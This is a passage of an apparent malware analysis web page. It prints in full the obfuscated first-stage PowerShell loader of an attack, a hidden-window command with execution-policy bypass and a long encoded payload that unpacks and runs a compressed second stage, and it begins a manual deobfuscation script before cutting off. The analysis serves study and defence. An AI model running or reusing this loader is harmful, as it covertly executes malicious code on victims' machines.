href=#initial-encoded-command>#</a></h3><p>The attack begins with a heavily obfuscated PowerShell command, executed stealthily:</p><div class="astro-code astro-code-themes github-dark github-light" style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto data-language=powershell tabindex=0><pre><code><span class=line><span style=color:#005cc5;--shiki-dark:#79B8FF>powershell.exe -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG9jAGUAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwJ5AFMAdAByAGUAYQBtAFIAZQBhAG0AKAAuAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgANABzAEkAQQBQAHQASQBMAFcAZwBDAEEANwBWAFgAYgBXACsAYgBTAEIARAArAFgAcQBuAC8AQQBWAFcAVwBqAEYAWABIAEwANgBtAFQAcABwACcAJwArACcAJwBFAGkAMwBXAEoARABqAEcAcwBuAEoAaABqAGMAMgBMAFYATwBHAEIAYgBZAGUAQQAwAEUARgB0AHUAawAxAC8AOQArAHMAeABqAHkAbwBqAHAAMwB1AHsAMQB9AE8ASwBoAE0AegB1AHoAcwB6AE8AUAB2AFAATQB6AE4AcABOAEEANQB1AFIATQBCAEEAaQBTAHgAewAxAH0AKwB2AEgAOABuAEYATQAvAFkAaQBxADIAMQBJAEYAYgB1AEIAaQBkADEAbwBXAEwAOQBPAFUARwBuAHQAYQBmAFYAUwBuAFEAagBuADYAMgBFAEMAMABHAGMAbwB5AGoAcQBoAFcAdQBMAEIASQB2ACcAJwArACcAJwB6ADgAMgA0AGEAeAB6AGgAZwArADMASABqAEUAagBPAFUASgBIAGkAOQBwAEEAUQBuAFkAawAzADQAUwA1AGoANgBPAE0AewAxAH0ASAAxADgAcwA3AGIARABQAGgAaAAxAEQANQBzADMARgBKAHcANgBWAEYAQwA3AEcAcwBhADkAawArAEYAbwA1AFEANABQAEMAMQBZAFcAaABiADMATABXAEcASABsAEgAQwB4AE8AcgAzADcAOQBYAGEALwBLAGkAOQBhAE0AagAzAHEAVQBVAFQAcwBhAHAAbgBDAGMAUAByAGgAawAnACcAKwAnACcATgBwAHQAUwBiADgAcgBQAEUATgBKADEAbQBFAHgAZQBxAEkAMgBIAEcAWQBoAEMANQByAFQARQBuAHcANgBiAGgAaABCAEkAbgBsADQAaQB1AHcAdABzAEUAagB6AFAAegBRAFMAYQBwAHcAbQBxAGYAegB4AEoAaQBsAGMAVgBBAGMAaQA5AHYAewAxAH0AUwA0AGwAVgArAEIAegBIAG8AWQAwAGMASgA4AHsAMQB9AEoAVQBxADAATABjADcANwBEAGYATABIADQAUQA1AHcAWAAyADkAKwBrAEEAUwBOAHIAMwBGAEEARABoAHUATQB3ADAAbgBHADgASQBUAHsAMQB9AE8ARwBuADAAcgBjAEMAaQArAHcAZQA0AEMAdABIAFEAVwBrADgAQgBiADEARwBvAGcAdABnAGwAWABXAEsAdwBFAEsAYQBWADEANABiACsAWQBFAGEALwB3AHQAZwBUAHYAcgBVAHIAaQBjAHkAVwBRAEcAcgBPADQAVgBvAGUAdwBIAGoAcgBvAEsASABSAFMAaQB2AGUAcQAxAFEATwBlAGMAaQA3AFUANABIAG4AawBBACcAJwArACcAJwAwAEQANABrADYAUABvAGwAaAAnACcAKwAnACcAegBhAGYASgBzAGQANABOAEQAVABSAFAAbgBNADgAeABVAE0AUABvAHYAagBNAEMARwA1ADcAbwBYAFEAcQBnAHMAagAyAE4AeABpAFkAewAxAH0AegBCAHMARABLAEoAVQAxAHgAYgBQAEMASQB1AFYATwB3AG8ATwBBAG4AcgBiAHoAWABYAEwAbgBWAEIATQA3AE8AWABNAEQATQAzAFEAKwBJAHMAbgB2AFIAZgBVAEsAQgBpAFgAYgBwAGMANQBuAFUAKwA5ADcAQgBMAEEAdAB6AEwAQQBtAHQATgA3AEoASwB5ADQAcQBHAG8AWQBKAGYAaQBIAEoARgBHAEsAWABZAEYALwBvAG4AVgBZAGcARQA3AFAAVQB5AHgAewAxAH0AegBFAE8ATQB5AGYASABMADIAcgB5AG0AcgBCAEgAWABTAGsAbAAxAE0ARQB4AHMAaQBHAHkAQwBYAGcARgBRAGEAKwA5AGQARwBZAGYATwBiAEcAcQBCAGkATwA4AEIAdgBUADIAWQAyAEIAcgB4AFkAVgBFAHcAYQBWADAAawBSAHgAewAxAH0AdQBUAHMAZgBnADEAQwAxAFMANgAwAGsAcQBRAHYAagBGAEQATABWAHIAZwBzADYAdABpAGgAMgA2AGcASQBLAEUAbABJAHMAbwB7ADEAfQBTAEYAKwBXAGYAMQB5AGQAMQBSAFMAaABtAHgAcgBZAFMAVgA1AGgAYQAxAGwAMgBnAFcAdQAzAGIARABJAEcARgB4AGEAawBOAFkAQQBZAEcASgAnACcAKwAnACcASABtAEcAYgBXAEoAUQBEAFUAaABmADYAeABNAEYAUwBwAGgATwB2ADMATAAxADYARQBJADYAdQBSAFMAbQBrAEQAMQBqAGEAUQBEAGgAZwBoAHMATwBnAE0AMAA2AFcARwBCAHoAZABFADYAUABXADAARABGAFQAMQB4AEgARgBhAHgARABLAEsANABkAEMATABRAC8AcQBSAEoARQBsAE8AYgAwAHMARAB6AHYAJwAnACsAJwAnAFYAdwA0ADYAVwBxAGIARABuAFAAUQBlAG0AUgBPAFMAewAxAH0AbQB4AEIAdABuAFkAYQBzAEwAcABnAGsAewAxAH0AbABDAEcATwBNAGoAQQByAHYALwBuAHgASwA4AEYAaQBIAHYAVABqAFgARQBSAEgATABIAE0AcwBMAG0AVQBNAHsAMQB9ADQARABsAFUAUwAvAFYAVABzAEwAQwA0AHgAeQBSAEcASQBHAGEAQwBoAHgAdQBKAGEAJwAnACsAJwAnAHMAQgBKADkAMgA5AHEAVgBHAC8ATgBDAFUAUwBlADkAawAzAEEAdQAzAEMAQgA1AHsAMQB9AHUAZABGAE0AUwBUAGYATQBtAFQAcAB5AEIAbABSAFgAbQBYADQAcgBrADYASABoACsAeQBwAHAAcQB4ADYAJwAnACsAJwAnAE0ATQAwAFAAMgB4AHEAdwBWAGYAewAxAH0AMQBNACsAZwBPADkAMQAwAGQAeABiACsAZQA3AFMARQAxAFUAdQBTADkAbABXAGwAdABDAGQAcAA5ADgATgBnAGUAUwBZAFkAQQBlADYAUQA2ADEAdQA1ADIASwBuAE8ANwBRAFUAegAzAFkAUQBGAEoAOQBXADIAcgBOAFcAcAA3AFUAVQByAHAARABYAGYASgBsADAAawBLAGUAcgB2AFcAMQBUAG4AdQBtAE4AcwArAG8AUgBCADUAMABWACcAJwArACcAJwBVAGYAOQA2AGEAUAA5AFIANwB0AHkAcAA5AFAALwB0AHAAdQBnAHEAOQBFAEEAKwBjAHEAMQBvADcAUwBQAGwAVgB4AC8AeABmAFYAbgBxADgAdABoAFQAOAA3AEgATgBoADkAcgB0ADQAbABNAHsAMQB9AE4AaABIAFYAbQA0ADEAMAA4AGQAVABNADUASwBtAHMAagBMAFQAegBFAGoAMQBQAG0ANAA5AHoAUgB3ACcAJwArACcAJwAyAE8ANABvAHYAJwAnACsAJwAnAHcAYgB4AEsAZABzAFAASQBiAE0ATABUAGIAZwA4ADIAZwBmAE0AdwBvAG0AJwAnACsAJwAnAGMAUABJADMAQgBYAE0AMgBjAEQAZwBtAGUAcQBoAHoATQBQAGEAUQBqAHAAdAB3AEgAVgBsADkAcwB1AGsAaABRAGIANwBmAEUAeQBZAEcANAAxAFUAWQBPAGQAdABvAHgARwBUAG4AYgBiAGIAMwA0AHgAUgB3AFIASABJAGQASgBrAGgAQgBRAEsAVwBiAGwARwAxAHIAYgBYAGIASgB1AFMAeABzADgARQAnACcAKwAnACcATAA5AEwASABUAGEAUwAnACcAKwAnACcAcgBRAGIAZgA0AGwAYgBSAGwAZgAnACcAKwAnACcATgAvADcAMAB2AFIAQQBWAHkAVwAyAGMAeQArAEQAegAyAEMAVAB3AE4AbwBKAHIASABXAFAASAA1AHkAQQByADAARgBNAFYATwBLAEMAegBkAGkATgByAHMAZgBnAHIAdABIAGEAYgBXAFYAdgAxADEAcQBSAHcAVQBmAGoAOAB0AFMANQAzAG4ANwB1AHUARQAyAFQANgA4AEgAYgBCADUALwBhAHkAMQBYAGIANQA3AHEAZQByAFgAcwBJAHoAcQBRAHYALwBiAHYAbABWAEUATwBGAC8AeAByAEUAVwB5AFYANAA4AE0AMQBzAE8AMQBjAGoAVwA3AHIAdgBtAFYAUQB5AHIAbwBkAG4AcwA4AFMAUgBCADQAbwBtAEkAWQBOAGMAMwBYAFMAMQAyADUAMABuAGgAVwBCAHoARABjAHUAUwBzACcAJwArACcAJwBkAGMAYgBOAE0ALwA0AGQAOQBEAE0ANQBPAFAAQgAxAHMAagBnAHYAVAB6AEYAOQByAGIAcABiADgAQwBIAFgAbAArAEgAOAAzADAAbAAyAHgATQBwADkAVQBpAC8AUAB3AFUATQBsAHAAcwB0AHMAdwB7ADEAfQBUAGIAWABtAC8AcABzAHQAagBKAC8AZgByAFQAQQB2AEgAYQBIAGIAVwBEAFgAdQBmAE8AMwAxAEQAUwBWAHYAMgB4AEYANQAvAHUAZQBmAFkARQBTAGQAdQB0AHIAVwBMAGkAdwA5AEEAOABMAGwAQgBBAHYAYgBwAGUARgBGAHgAagA5AHUAVwB6AHYAdgBBACsAMwBjAFYAUgB6AE4ARwB6ADMAagArAFcAcAA4AGIAVwBYAEgAaQBXAHgAVAA0AEQALwAyAHIAcgBFAE4ASwBHAEMAdABGAFIAeABxAEgAaABHAHUASQBJAHIALwBkAHIASABBAGMAWQBBAHIAWABBAGIAZwB3AGwATwBtAEwASwBBADEAdAAzAGgARgA1ADYANABKAG0AdgBHACsAUgB2AEcATQBiAGEAdQA3AFYAbwBhACsAYQA4AEMAaABZAGUAKwBxAFQANQBkAFQANQArAFEAeAA4AGgASQBMAEEAYwA3AFUAeAB4AEkASABIAC8ASABwAHIAOQA2AG4AVgBnAGcAYgBYADIAcgBVADYAZQBlAEsALwAvAFcAVABkAE0ATQByAEUAMwBGAGkAZAB0ADgAZwBjAG0AdABJADYAegBhADIAJwAnACsAJwAnAEQAUQBlAEkASwBvAHYAagBiADAAWQBLAHIARQBJAE8AUwAvAEMAcABlAHIAMABFAEgATwA2ACsAZwBnAEUASgBGADMAMQBjADEARABxAEEAVQBoAHYAUQA1AGYATQBXADUASAB0AG4AdwBIAEQAMgBBAHIAUQAxAEgAbgAvAE4AYgAwAEoANABtAFkATwBJAEkAMwB3AHMAJwAnACsAJwAnAFYAeAB1ADgASQB6ACsAOABjAEYAUwB1AEoAZgB5AHQAeABpAHUAcgBzAHcANAAvAHoATAA4AFIANQBtAHYAdQBIADEAVABlAFIAcQBWAFgAZgB3AC8AUABMADkATQB1AEoAewAxAH0AMwAzAHQAJwAnACsAJwAnADkAdwBFAHcAJwAnACsAJwAnAHQAUQBnAEQAUQBSADIAYQBEAE0AWAA3AGkAOAA5AEIASABJAHAAYwBlAFIAewAxAH0AaABDAEEAMABrAGcAbABzADgALwBBAC8AQgBkAGMAcQBPAHIAdQBCADYAbQBiAGUANQB2AHcARgBiAE4ARQBxAHUAaQB3AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBaACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA</span></span>
<span class=line></span></code></pre><span class="duration-300 absolute transition-opacity right-3 text-muted-foreground top-3 language select-none text-sm">powershell</span><button class="duration-300 absolute rounded bg-primary-foreground border border-border box-content copy opacity-0 p-1 right-3 text-muted-foreground top-3 transition-opacity" data-code="powershell.exe -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG9jAGUAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwJ5AFMAdAByAGUAYQBtAFIAZQBhAG0AKAAuAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgANABzAEkAQQBQAHQASQBMAFcAZwBDAEEANwBWAFgAYgBXACsAYgBTAEIARAArAFgAcQBuAC8AQQBWAFcAVwBqAEYAWABIAEwANgBtAFQAcABwACcAJwArACcAJwBFAGkAMwBXAEoARABqAEcAcwBuAEoAaABqAGMAMgBMAFYATwBHAEIAYgBZAGUAQQAwAEUARgB0AHUAawAxAC8AOQArAHMAeABqAHkAbwBqAHAAMwB1AHsAMQB9AE8ASwBoAE0AegB1AHoAcwB6AE8AUAB2AFAATQB6AE4AcABOAEEANQB1AFIATQBCAEEAaQBTAHgAewAxAH0AKwB2AEgAOABuAEYATQAvAFkAaQBxADIAMQBJAEYAYgB1AEIAaQBkADEAbwBXAEwAOQBPAFUARwBuAHQAYQBmAFYAUwBuAFEAagBuADYAMgBFAEMAMABHAGMAbwB5AGoAcQBoAFcAdQBMAEIASQB2ACcAJwArACcAJwB6ADgAMgA0AGEAeAB6AGgAZwArADMASABqAEUAagBPAFUASgBIAGkAOQBwAEEAUQBuAFkAawAzADQAUwA1AGoANgBPAE0AewAxAH0ASAAxADgAcwA3AGIARABQAGgAaAAxAEQANQBzADMARgBKAHcANgBWAEYAQwA3AEcAcwBhADkAawArAEYAbwA1AFEANABQAEMAMQBZAFcAaABiADMATABXAEcASABsAEgAQwB4AE8AcgAzADcAOQBYAGEALwBLAGkAOQBhAE0AagAzAHEAVQBVAFQAcwBhAHAAbgBDAGMAUAByAGgAawAnACcAKwAnACcATgBwAHQAUwBiADgAcgBQAEUATgBKADEAbQBFAHgAZQBxAEkAMgBIAEcAWQBoAEMANQByAFQARQBuAHcANgBiAGgAaABCAEkAbgBsADQAaQB1AHcAdABzAEUAagB6AFAAegBRAFMAYQBwAHcAbQBxAGYAegB4AEoAaQBsAGMAVgBBAGMAaQA5AHYAewAxAH0AUwA0AGwAVgArAEIAegBIAG8AWQAwAGMASgA4AHsAMQB9AEoAVQBxADAATABjADcANwBEAGYATABIADQAUQA1AHcAWAAyADkAKwBrAEEAUwBOAHIAMwBGAEEARABoAHUATQB3ADAAbgBHADgASQBUAHsAMQB9AE8ARwBuADAAcgBjAEMAaQArAHcAZQA0AEMAdABIAFEAVwBrADgAQgBiADEARwBvAGcAdABnAGwAWABXAEsAdwBFAEsAYQBWADEANABiACsAWQBFAGEALwB3AHQAZwBUAHYAcgBVAHIAaQBjAHkAVwBRAEcAcgBPADQAVgBvAGUAdwBIAGoAcgBvAEsASABSAFMAaQB2AGUAcQAxAFEATwBlAGMAaQA3AFUANABIAG4AawBBACcAJwArACcAJwAwAEQANABrADYAUABvAGwAaAAnACcAKwAnACcAegBhAGYASgBzAGQANABOAEQAVABSAFAAbgBNADgAeABVAE0AUABvAHYAagBNAEMARwA1ADcAbwBYAFEAcQBnAHMAagAyAE4AeABpAFkAewAxAH0AegBCAHMARABLAEoAVQAxAHgAYgBQAEMASQB1AFYATwB3AG8ATwBBAG4AcgBiAHoAWABYAEwAbgBWAEIATQA3AE8AWABNAEQATQAzAFEAKwBJAHMAbgB2AFIAZgBVAEsAQgBpAFgAYgBwAGMANQBuAFUAKwA5ADcAQgBMAEEAdAB6AEwAQQBtAHQATgA3AEoASwB5ADQAcQBHAG8AWQBKAGYAaQBIAEoARgBHAEsAWABZAEYALwBvAG4AVgBZAGcARQA3AFAAVQB5AHgAewAxAH0AegBFAE8ATQB5AGYASABMADIAcgB5AG0AcgBCAEgAWABTAGsAbAAxAE0ARQB4AHMAaQBHAHkAQwBYAGcARgBRAGEAKwA5AGQARwBZAGYATwBiAEcAcQBCAGkATwA4AEIAdgBUADIAWQAyAEIAcgB4AFkAVgBFAHcAYQBWADAAawBSAHgAewAxAH0AdQBUAHMAZgBnADEAQwAxAFMANgAwAGsAcQBRAHYAagBGAEQATABWAHIAZwBzADYAdABpAGgAMgA2AGcASQBLAEUAbABJAHMAbwB7ADEAfQBTAEYAKwBXAGYAMQB5AGQAMQBSAFMAaABtAHgAcgBZAFMAVgA1AGgAYQAxAGwAMgBnAFcAdQAzAGIARABJAEcARgB4AGEAawBOAFkAQQBZAEcASgAnACcAKwAnACcASABtAEcAYgBXAEoAUQBEAFUAaABmADYAeABNAEYAUwBwAGgATwB2ADMATAAxADYARQBJADYAdQBSAFMAbQBrAEQAMQBqAGEAUQBEAGgAZwBoAHMATwBnAE0AMAA2AFcARwBCAHoAZABFADYAUABXADAARABGAFQAMQB4AEgARgBhAHgARABLAEsANABkAEMATABRAC8AcQBSAEoARQBsAE8AYgAwAHMARAB6AHYAJwAnACsAJwAnAFYAdwA0ADYAVwBxAGIARABuAFAAUQBlAG0AUgBPAFMAewAxAH0AbQB4AEIAdABuAFkAYQBzAEwAcABnAGsAewAxAH0AbABDAEcATwBNAGoAQQByAHYALwBuAHgASwA4AEYAaQBIAHYAVABqAFgARQBSAEgATABIAE0AcwBMAG0AVQBNAHsAMQB9ADQARABsAFUAUwAvAFYAVABzAEwAQwA0AHgAeQBSAEcASQBHAGEAQwBoAHgAdQBKAGEAJwAnACsAJwAnAHMAQgBKADkAMgA5AHEAVgBHAC8ATgBDAFUAUwBlADkAawAzAEEAdQAzAEMAQgA1AHsAMQB9AHUAZABGAE0AUwBUAGYATQBtAFQAcAB5AEIAbABSAFgAbQBYADQAcgBrADYASABoACsAeQBwAHAAcQB4ADYAJwAnACsAJwAnAE0ATQAwAFAAMgB4AHEAdwBWAGYAewAxAH0AMQBNACsAZwBPADkAMQAwAGQAeABiACsAZQA3AFMARQAxAFUAdQBTADkAbABXAGwAdABDAGQAcAA5ADgATgBnAGUAUwBZAFkAQQBlADYAUQA2ADEAdQA1ADIASwBuAE8ANwBRAFUAegAzAFkAUQBGAEoAOQBXADIAcgBOAFcAcAA3AFUAVQByAHAARABYAGYASgBsADAAawBLAGUAcgB2AFcAMQBUAG4AdQBtAE4AcwArAG8AUgBCADUAMABWACcAJwArACcAJwBVAGYAOQA2AGEAUAA5AFIANwB0AHkAcAA5AFAALwB0AHAAdQBnAHEAOQBFAEEAKwBjAHEAMQBvADcAUwBQAGwAVgB4AC8AeABmAFYAbgBxADgAdABoAFQAOAA3AEgATgBoADkAcgB0ADQAbABNAHsAMQB9AE4AaABIAFYAbQA0ADEAMAA4AGQAVABNADUASwBtAHMAagBMAFQAegBFAGoAMQBQAG0ANAA5AHoAUgB3ACcAJwArACcAJwAyAE8ANABvAHYAJwAnACsAJwAnAHcAYgB4AEsAZABzAFAASQBiAE0ATABUAGIAZwA4ADIAZwBmAE0AdwBvAG0AJwAnACsAJwAnAGMAUABJADMAQgBYAE0AMgBjAEQAZwBtAGUAcQBoAHoATQBQAGEAUQBqAHAAdAB3AEgAVgBsADkAcwB1AGsAaABRAGIANwBmAEUAeQBZAEcANAAxAFUAWQBPAGQAdABvAHgARwBUAG4AYgBiAGIAMwA0AHgAUgB3AFIASABJAGQASgBrAGgAQgBRAEsAVwBiAGwARwAxAHIAYgBYAGIASgB1AFMAeABzADgARQAnACcAKwAnACcATAA5AEwASABUAGEAUwAnACcAKwAnACcAcgBRAGIAZgA0AGwAYgBSAGwAZgAnACcAKwAnACcATgAvADcAMAB2AFIAQQBWAHkAVwAyAGMAeQArAEQAegAyAEMAVAB3AE4AbwBKAHIASABXAFAASAA1AHkAQQByADAARgBNAFYATwBLAEMAegBkAGkATgByAHMAZgBnAHIAdABIAGEAYgBXAFYAdgAxADEAcQBSAHcAVQBmAGoAOAB0AFMANQAzAG4ANwB1AHUARQAyAFQANgA4AEgAYgBCADUALwBhAHkAMQBYAGIANQA3AHEAZQByAFgAcwBJAHoAcQBRAHYALwBiAHYAbABWAEUATwBGAC8AeAByAEUAVwB5AFYANAA4AE0AMQBzAE8AMQBjAGoAVwA3AHIAdgBtAFYAUQB5AHIAbwBkAG4AcwA4AFMAUgBCADQAbwBtAEkAWQBOAGMAMwBYAFMAMQAyADUAMABuAGgAVwBCAHoARABjAHUAUwBzACcAJwArACcAJwBkAGMAYgBOAE0ALwA0AGQAOQBEAE0ANQBPAFAAQgAxAHMAagBnAHYAVAB6AEYAOQByAGIAcABiADgAQwBIAFgAbAArAEgAOAAzADAAbAAyAHgATQBwADkAVQBpAC8AUAB3AFUATQBsAHAAcwB0AHMAdwB7ADEAfQBUAGIAWABtAC8AcABzAHQAagBKAC8AZgByAFQAQQB2AEgAYQBIAGIAVwBEAFgAdQBmAE8AMwAxAEQAUwBWAHYAMgB4AEYANQAvAHUAZQBmAFkARQBTAGQAdQB0AHIAVwBMAGkAdwA5AEEAOABMAGwAQgBBAHYAYgBwAGUARgBGAHgAagA5AHUAVwB6AHYAdgBBACsAMwBjAFYAUgB6AE4ARwB6ADMAagArAFcAcAA4AGIAVwBYAEgAaQBXAHgAVAA0AEQALwAyAHIAcgBFAE4ASwBHAEMAdABGAFIAeABxAEgAaABHAHUASQBJAHIALwBkAHIASABBAGMAWQBBAHIAWABBAGIAZwB3AGwATwBtAEwASwBBADEAdAAzAGgARgA1ADYANABKAG0AdgBHACsAUgB2AEcATQBiAGEAdQA3AFYAbwBhACsAYQA4AEMAaABZAGUAKwBxAFQANQBkAFQANQArAFEAeAA4AGgASQBMAEEAYwA3AFUAeAB4AEkASABIAC8ASABwAHIAOQA2AG4AVgBnAGcAYgBYADIAcgBVADYAZQBlAEsALwAvAFcAVABkAE0ATQByAEUAMwBGAGkAZAB0ADgAZwBjAG0AdABJADYAegBhADIAJwAnACsAJwAnAEQAUQBlAEkASwBvAHYAagBiADAAWQBLAHIARQBJAE8AUwAvAEMAcABlAHIAMABFAEgATwA2ACsAZwBnAEUASgBGADMAMQBjADEARABxAEEAVQBoAHYAUQA1AGYATQBXADUASAB0AG4AdwBIAEQAMgBBAHIAUQAxAEgAbgAvAE4AYgAwAEoANABtAFkATwBJAEkAMwB3AHMAJwAnACsAJwAnAFYAeAB1ADgASQB6ACsAOABjAEYAUwB1AEoAZgB5AHQAeABpAHUAcgBzAHcANAAvAHoATAA4AFIANQBtAHYAdQBIADEAVABlAFIAcQBWAFgAZgB3AC8AUABMADkATQB1AEoAewAxAH0AMwAzAHQAJwAnACsAJwAnADkAdwBFAHcAJwAnACsAJwAnAHQAUQBnAEQAUQBSADIAYQBEAE0AWAA3AGkAOAA5AEIASABJAHAAYwBlAFIAewAxAH0AaABDAEEAMABrAGcAbABzADgALwBBAC8AQgBkAGMAcQBPAHIAdQBCADYAbQBiAGUANQB2AHcARgBiAE4ARQBxAHUAaQB3AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBaACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
" onclick="navigator.clipboard.writeText(this.dataset.code);
          this.classList.add(&#x27;copied&#x27;);
          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)"><div class=ready><svg class=size-5><use href=/icons/code.svg#mingcute-clipboard-line></use></svg></div><div class="hidden success"><svg class=size-5><use href=/icons/code.svg#mingcute-file-check-line></use></svg></div></button></div><p>This deobfuscation can also be performed manually for analysis, using the Base64 string from the first-stage script, to obtain the second-stage script:</p><div class="astro-code astro-code-themes github-dark github-light" style=background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8;overflow-x:auto data-language=powershell tabindex=0><pre><code><span class=line><span style=color:#24292e;--shiki-dark:#E1E4E8>$compressed </span><span style=color:#d73a49;--shiki-dark:#F97583>=</span><span style=color:#24292e;--shiki-dark:#E1E4E8> (((</span><span style=color:#032f62;--shiki-dark:#9ECBFF>"H4sIAPtILWgCA7VXbW+bSBD+Xqn/AVWWjFXHL6mTpp"</span><span style=color:#d73a49;--shiki-dark:#F97583> +</span><span style=color:#032f62;--shiki-dark:#9ECBFF> "Ei3WJDjGsnJhjc2LVOGBbYeA0EFtuk1/9+sxjyojp3u{1}OKhMzuzszOPvPMzNpNA5uRMBAiSx{1}+vH8nFM/Yiq21IFbuBid1oWL9OUGntafVSnQjn62EC0GcoyjqhWuLBIv"</span><span style=color:#d73a49;--shiki-dark:#F97583> +</span><span style=color:#032f62;--shiki-dark:#9ECBFF> 